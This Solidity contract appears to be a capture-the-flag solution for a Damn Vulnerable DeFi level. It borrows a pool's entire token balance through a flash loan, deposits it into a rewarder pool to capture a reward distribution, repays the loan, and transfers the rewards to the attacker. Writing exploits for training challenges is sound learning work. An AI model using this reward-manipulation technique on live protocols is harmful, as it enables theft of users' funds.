// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

interface IRewardToken {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address owner) external returns (uint256);
}

contract ExploitReward {
    DamnValuableToken i_liquidityToken;
    IFlashLoanerPool i_flashLoanerPool;
    ITheRewarderPool i_theRewarderPool;
    IRewardToken i_rewardToken;
    address immutable i_attacker;

    constructor(address lt, address fp, address rp, address rt) {
        i_liquidityToken = DamnValuableToken(lt);
        i_flashLoanerPool = IFlashLoanerPool(fp);
        i_theRewarderPool = ITheRewarderPool(rp);
        i_rewardToken = IRewardToken(rt);
        i_attacker = msg.sender;
    }

    function flashLoan() external {
        uint256 loanAmount = i_liquidityToken.balanceOf(address(i_flashLoanerPool));
        console.log("Asking for a flashloan of %s", loanAmount);
        i_flashLoanerPool.flashLoan(loanAmount);
        
    }

    function receiveFlashLoan(uint256 amount) external {
        console.log("Receiving flashloan of %s", amount);

        i_liquidityToken.approve(address(i_theRewarderPool), amount);
        i_theRewarderPool.deposit(amount);
        console.log("Deposited..distributing rewards");

        i_theRewarderPool.withdraw(amount);
        console.log("Tokens withdrawn");

        i_liquidityToken.transfer(address(i_flashLoanerPool), amount);
        console.log("Transfered back to loaner");

        uint256 rewards = i_rewardToken.balanceOf(address(this));
        i_rewardToken.transfer(i_attacker, rewards);
        console.log("Transfering rewards to attacker %s", rewards);
    }
}